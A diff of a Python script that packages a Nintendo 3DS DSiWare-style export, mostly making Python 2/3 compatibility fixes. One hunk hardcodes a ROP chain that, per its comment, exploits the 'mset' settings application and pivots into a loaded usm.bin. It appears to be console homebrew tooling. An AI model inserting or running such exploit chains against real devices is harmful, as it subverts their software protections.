@@ -29,11 +29,10 @@ tad_sections=[b""]*14
 
 if sys.version_info[0] >= 3:
 	# Python 3
-	def bytechr(c):
-		return bytes([c])
+	pyvers=3
 else:
 	# Python 2
-	bytechr = chr
+	pyvers=2
 
 def get_keyy():
 	global keyy
@@ -119,11 +118,11 @@ def get_content_block(buff):
 	key = int16bytes(normalkey(cmac_keyx, keyy))
 	cipher = CMAC.new(key, ciphermod=AES)
 	result = cipher.update(hash)
-	return result.digest() + b''.join(bytechr(random.randint(0,255)) for _ in range(16))
+	return result.digest() + b'\x00'*16
 
 def fix_hashes_and_sizes():
 	sizes=[0]*11
-	hashes=[""]*13
+	hashes=[b""]*13
 	footer_namelist=["banner.bin","header.bin"]+content_namelist
 	for i in range(11):
 		if(os.path.exists(DIR+content_namelist[i])):
@@ -192,7 +191,10 @@ def fix_crc16(path, offset, size, crc_offset, type):
 		poly=0xA001
 		crc = type
 		for b in data:
-			cur_byte = 0xFF & ord(b)
+			if pyvers==3:
+				cur_byte = 0xFF & b
+			else:
+				cur_byte = 0xFF & ord(b)
 			for _ in range(0, 8):
 				if (crc & 0x0001) ^ (cur_byte & 0x0001):
 					crc = (crc >> 1) ^ poly
@@ -206,9 +208,8 @@ def fix_crc16(path, offset, size, crc_offset, type):
 		f.seek(crc_offset)
 		f.write(struct.pack("<H",crc16))
 
-def inject_bin(src, dest, offset, ispad):
-	with open(src, "rb") as f:
-		buff=f.read()
+def inject_bin(src, dest, offset, ispad): #this long hexstring is just a bin->str converted rop_payload.bin. this is the rop that exploits mset and loads usm.bin to memory and pivots to it.
+	buff=b"\x60\x67\x14\x00\xC4\x93\x29\x00\xA4\x13\x1C\x00\xEF\xBE\xAD\xDE\x01\xBE\xAD\xDE\x00\xBE\xAD\xDE\x60\x67\x14\x00\x03\xFF\xFF\x0F\x88\x37\x24\x00\xE4\xAD\xDE\xAD\x60\x67\x14\x00\x60\xCB\x28\x00\x58\x16\x1A\x00\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\x55\x46\x16\x00\x00\x10\x68\x00\xEC\xFE\xFF\x0F\x01\x00\x01\x00\x10\x79\x1C\x00\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xE5\xC0\x22\x00\x00\x10\x68\x00\x20\x10\x68\x00\x00\x20\x68\x00\x00\x02\x02\x00\x44\x31\x1C\x00\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\x4C\xD4\x10\x00\x14\x61\x68\xF0\x10\x66\x14\x00\x59\x00\x53\x00\x3A\x00\x2F\x00\x75\x00\x73\x00\x6D\x00\x2E\x00\x62\x00\x69\x00\x6E\x00\x00\x21\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\x10\x66\x14\x00\xAC\x64\x12\x00\x40\xFF\xFF\x0F\xEC\xFE\xFF\x0F\x28\xFF\xFF\x0F\xF0\xFE\xFF\xFF\x1C\xFF\xFF\x0F\xE4\xAD\xDE\xAD"
 	srclen=len(buff)
 	padlen=0x1000-srclen
 	if ispad:
@@ -231,7 +232,7 @@ try:
 	print("/F00D43D5 created")
 except:
 	print("/F00D43D5 already exists")
-banner_bin=b"\x03\x01"+"\x00"*(0x4000-2)
+banner_bin=b"\x03\x01"+b"\x00"*(0x4000-2)
 header_bin=b"3DFT"+struct.pack(">I",4)+(b"\x42"*0x20)+(b"\x99"*0x10)+struct.pack("<Q",0x00048005F00D43D5)+(b"\x00"*0xB0)
 footer_bin=b"\x00"*0x4E0
 
